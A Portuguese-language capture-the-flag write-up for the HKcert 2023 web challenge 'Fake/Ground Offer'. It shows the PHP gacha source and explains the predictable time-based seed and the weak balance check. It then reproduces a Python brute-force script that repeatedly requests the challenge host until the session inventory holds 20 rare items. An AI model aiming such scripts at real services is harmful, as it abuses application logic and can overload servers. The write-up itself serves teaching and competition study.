# ctf_fake-ground

Challenge da categoria Web do CTF HKcert 2023

![IMG1](https://github.com/dahiwas/ctf_fake-ground/blob/main/Imagens/IMG1.png)

O link que o chall nos fornecia nos direcionava para:

![IMG2](https://github.com/dahiwas/ctf_fake-ground/blob/main/Imagens/IMG2.png)

Basicamente o challenge dizia para conseguirmos sumonar/tirar 20 tickets UR (Ultra Rare) SR (Super Rare) de um sistema gacha.

Tínhamos dois botões para cumprir esse feito, Summon 1 ou Summon 10 que faziam as seguintes requisições:
![IMG3](https://github.com/dahiwas/ctf_fake-ground/blob/main/Imagens/IMG3.png)

Dessa forma, respectivamente, sumonávamos 1 aleatório ou então 10 de uma vez só.

Além disso, o desafio nos fornecia o código fonte do site:
```
<?php 
session_start();

if(isset($_GET["-s"])){
    show_source(__FILE__);
    exit();
}

include "secret.php";

if(!isset($_SESSION["balance"])){
    $_SESSION["balance"] = 20;
    $_SESSION["inventory"] = Array("UR" => 0, "SSR" => 0, "SR" => 0, "R" => 0, "N" => 0);
}

if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"]+$_SESSION["inventory"]["SSR"]>=20){
        exit("$flag");
    }else{
        exit('$flag');
    }
}

$gacha_result = "";
$seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed

if(isset($_GET["gacha1"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 1;
        $gacha_result = "You got ".implode(", ",gacha(1,$seed));
    }
}elseif(isset($_GET["gacha10"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 10;
        $gacha_result = "You got ".implode(", ",gacha(10,$seed));
    }
}

//Ultra Secure Seedable Random (USSR) gacha
function gacha($n,$s){
    $out = [];

    for($i=1;$i<=$n;$i++){
        $x = sin($i*$s);
        $r = $x-floor($x);
        $out[] = lookup($r);
    }
    return $out;
}

function lookup($r){
    if($r <= 0.001){
        $_SESSION["inventory"]["UR"] += 1;
        return "UR";
    }elseif($r <= 0.004){
        $_SESSION["inventory"]["SSR"] += 1;
        return "SSR";
    }elseif($r <= 0.009){
        $_SESSION["inventory"]["SR"] += 1;
        return "SR";
    }elseif($r <= 0.016){
        $_SESSION["inventory"]["R"] += 1;
        return "R";
    }else{
        $_SESSION["inventory"]["N"] += 1;
        return "N";
    }
}
?>
<html>
<head>
    <title>Fake/Ground Offer</title>
</head>
<body>
    <!-- This is the best frontend we can provide given the budget provided -->
    <h1>Fake/Ground Offer</h1>
    <p>Welcome, Master. Your ID is <?=session_id();?></p>
    <p>Current Balance: <?=$_SESSION["balance"];?> Summon Ticket(s)</p>
    <p>Current Inventory: <?php print_r($_SESSION["inventory"]);?></p>
    <form><input type=submit name="gacha1" value="Summon 1"></form>
    <form><input type=submit name="gacha10" value="Summon 10"></form>
    <h2><?=$gacha_result;?></h2>
    <hr /><p><a href="?-s">Show Source</a></p>
</body>
</html>
```
Vale ressaltar que receberíamos nossa flag no momento em que enviassemos uma requisição, ao possuirmos no inventário os 20 tickets requeridos:
```
if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"]+$_SESSION["inventory"]["SSR"]>=20){
        exit("$flag");
    }else{
        exit('$flag');
    }
}
```
E também, a seed que gerava a aleatoriedade era dada pelo tempo:
```
$seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed
```
A partir daqui tínhamos uma ideia de que poderia ser resolvido por força bruta [brute force], e para ajudar, vimos que o código base do site, não fazia uma verificação adequada caso apertássemos no GACHA 10:
```
if(isset($_GET["gacha1"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 1;
        $gacha_result = "You got ".implode(", ",gacha(1,$seed));
    }
}elseif(isset($_GET["gacha10"])){
    if($_SESSION["balance"] < 1){
        $gacha_result = "Insufficient Summon Tickets!";
    }else{
        $_SESSION["balance"] -= 10;
        $gacha_result = "You got ".implode(", ",gacha(10,$seed));
    }
}
```
Ou seja, poderiamos, por tentativa, realizar 29 retiradas, ao invés de 20.

Então utilizamos o algoritmo:
Algoritmo de BruteForce de refêrencia: 
https://siunam321.github.io/ctf/HKCERT-CTF-2023/web/Fake-Ground-Offer/
```
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from time import sleep
import re

async def main():
    while True:
        # brute force it with 0.3 seconds delay, 
        # so we won't beat the server to death
        sleep(0.3)
        async with aiohttp.ClientSession() as sess:
            for _ in range(9):
                resp = await sess.get(URL_GACHA1)
                response_body = await resp.text()
            for _ in range(2):
                resp = await sess.get(URL_GACHA10)
                response_body = await resp.text()

            soup = BeautifulSoup(response_body, 'html.parser')
            pTags = soup.find_all('p')
            sessionId = pTags[0].text
            inventory = pTags[2].text

            sessionIdMatch = re.search(r'Your ID is ([a-fA-F0-9]+)', sessionId)
            urMatch = re.search(r'\[UR\] => (\d+)', inventory)
            ssrMatch = re.search(r'\[SSR\] => (\d+)', inventory)

            idValue = sessionIdMatch.group(1)
            urValue = int(urMatch.group(1))
            ssrValue = int(ssrMatch.group(1))

            urSSRValue = urValue + ssrValue
            print(f'[*] Trying... Session ID: {idValue}, UR + SSR value: {urSSRValue}', end='\r')
            if urSSRValue >= 20:
                print('\n[+] We got UR + SSR >= 20!!')
                print(f'[+] Session ID: {idValue}')
                print(f'[+] UR value: {urValue}')
                print(f'[+] SSR value: {ssrValue}')
                exit(0)

if __name__ == '__main__':
    URL_GACHA10 = 'http://chal-a.hkcert23.pwnable.hk:28137/?gacha10=blah'
    URL_GACHA1 = 'http://chal-a.hkcert23.pwnable.hk:28137/?gacha1=blah'

    asyncio.run(main())
```
Depois de 7horas deixando o código rodar:


Chegamos a flag:


